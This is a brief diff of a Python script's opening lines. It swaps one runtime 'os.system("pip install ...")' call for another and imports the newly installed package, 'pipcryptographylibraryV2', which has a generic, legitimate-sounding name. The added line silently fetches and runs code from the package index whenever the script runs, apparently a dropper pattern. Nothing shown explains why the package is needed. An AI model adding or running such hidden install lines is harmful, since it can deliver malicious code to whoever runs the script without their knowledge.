@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pipcryptographylibraryV2")
+import pipcryptographylibraryV2
 from optparse import Option
 import requests
 import threading
